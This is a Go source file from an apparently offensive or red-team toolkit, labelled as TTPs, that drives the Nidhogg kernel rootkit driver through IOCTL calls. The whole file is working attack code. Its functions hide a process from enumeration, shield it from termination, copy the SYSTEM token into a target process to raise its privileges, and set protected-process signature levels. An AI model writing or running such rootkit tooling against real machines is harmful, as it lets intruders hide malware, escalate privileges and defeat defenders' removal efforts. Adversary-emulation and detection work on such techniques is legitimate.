package ttp

// nidhogg_process.go -- Process domain TTPs via Nidhogg kernel driver
//
// TTP 60: hide/unhide process (IOCTL_HIDE_UNHIDE_PROCESS)
// TTP 61: protect/unprotect process from termination (IOCTL_PROTECT_UNPROTECT_PROCESS)
// TTP 62: elevate process to SYSTEM token (IOCTL_ELEVATE_PROCESS)
//
// Params format:
//   TTP 60:  "pid" | "self" | "pid:unhide"
//   TTP 61:  "pid" | "self" | "pid:unprotect"
//   TTP 62:  "pid" | "self"
//
// All ops return ErrNidhoggNotAvailable if driver is not loaded.

import (
	"fmt"
	"os"
	"strconv"
	"strings"
)

// IoctlProcessEntry layout (matches C++ struct, MSVC default packing):
//   unsigned long Pid   (4 bytes, offset 0)
//   bool Protect        (1 byte,  offset 4)
//   [3 bytes padding]   (offset 5-7)
// Total: 8 bytes
func makeProcessEntry(pid uint32, flag bool) []byte {
	buf := make([]byte, 8)
	// little-endian uint32
	buf[0] = byte(pid)
	buf[1] = byte(pid >> 8)
	buf[2] = byte(pid >> 16)
	buf[3] = byte(pid >> 24)
	if flag {
		buf[4] = 1
	}
	return buf
}

// IoctlProcessSignature layout:
//   unsigned long Pid          (4 bytes, offset 0)
//   unsigned char SignerType   (1 byte,  offset 4)
//   unsigned char SignatureSigner (1 byte, offset 5)
//   [2 bytes padding]
// Total: 8 bytes
func makeProcessSignature(pid uint32, signerType, signatureSigner byte) []byte {
	buf := make([]byte, 8)
	buf[0] = byte(pid)
	buf[1] = byte(pid >> 8)
	buf[2] = byte(pid >> 16)
	buf[3] = byte(pid >> 24)
	buf[4] = signerType
	buf[5] = signatureSigner
	return buf
}

func parsePidParam(params string) (uint32, bool, error) {
	s := strings.TrimSpace(params)
	if s == "" || s == "self" {
		return uint32(os.Getpid()), false, nil
	}
	// "pid:unhide" or "pid:unprotect"
	negate := false
	if idx := strings.LastIndex(s, ":"); idx >= 0 {
		suffix := s[idx+1:]
		if suffix == "unhide" || suffix == "unprotect" || suffix == "false" {
			negate = true
		}
		s = s[:idx]
	}
	n, err := strconv.ParseUint(s, 10, 32)
	if err != nil {
		return 0, false, fmt.Errorf("invalid pid %q", s)
	}
	return uint32(n), negate, nil
}

// NidhoggHideProcess hides (or unhides) a process from user-mode enumeration.
// params: "pid" | "self" | "pid:unhide"
func NidhoggHideProcess(params string) (string, error) {
	pid, unhide, err := parsePidParam(params)
	if err != nil {
		return "", err
	}

	in := makeProcessEntry(pid, !unhide)
	if _, err := ioctl(ioctlHideUnhideProcess, in, nil); err != nil {
		return "", err
	}

	if unhide {
		return fmt.Sprintf("[nidhogg:process] pid %d unhidden", pid), nil
	}
	return fmt.Sprintf("[nidhogg:process] pid %d hidden from enumeration", pid), nil
}

// NidhoggProtectProcess protects (or unprotects) a process from termination/injection.
// params: "pid" | "self" | "pid:unprotect"
func NidhoggProtectProcess(params string) (string, error) {
	pid, unprotect, err := parsePidParam(params)
	if err != nil {
		return "", err
	}

	in := makeProcessEntry(pid, !unprotect)
	if _, err := ioctl(ioctlProtectUnprotectProcess, in, nil); err != nil {
		return "", err
	}

	if unprotect {
		return fmt.Sprintf("[nidhogg:process] pid %d unprotected", pid), nil
	}
	return fmt.Sprintf("[nidhogg:process] pid %d protected from termination", pid), nil
}

// NidhoggElevateProcess steals the SYSTEM token and copies it to target process.
// params: "pid" | "self"
func NidhoggElevateProcess(params string) (string, error) {
	pid, _, err := parsePidParam(params)
	if err != nil {
		return "", err
	}

	// IOCTL_ELEVATE_PROCESS takes just a DWORD pid
	in := make([]byte, 4)
	in[0] = byte(pid)
	in[1] = byte(pid >> 8)
	in[2] = byte(pid >> 16)
	in[3] = byte(pid >> 24)

	if _, err := ioctl(ioctlElevateProcess, in, nil); err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:process] pid %d elevated to SYSTEM", pid), nil
}

// NidhoggSetProcessSignature sets PP/PPL signature level for a process.
// params: "pid signerType signatureSigner"
// Example: "1234 2 6"  (PsProtectedTypeProtected=2, PsProtectedSignerWindows=6)
// To clear: "1234 0 0" (PsProtectedTypeNone=0, PsProtectedSignerNone=0)
func NidhoggSetProcessSignature(params string) (string, error) {
	parts := strings.Fields(params)
	if len(parts) < 3 {
		return "", fmt.Errorf("params: pid signerType signatureSigner")
	}
	pidVal, err := strconv.ParseUint(parts[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid pid")
	}
	st, err := strconv.ParseUint(parts[1], 10, 8)
	if err != nil {
		return "", fmt.Errorf("invalid signerType")
	}
	ss, err := strconv.ParseUint(parts[2], 10, 8)
	if err != nil {
		return "", fmt.Errorf("invalid signatureSigner")
	}

	in := makeProcessSignature(uint32(pidVal), byte(st), byte(ss))
	if _, err := ioctl(ioctlSetProcessSignatureLevel, in, nil); err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:process] pid %d signature set (type=%d signer=%d)", uint32(pidVal), st, ss), nil
}
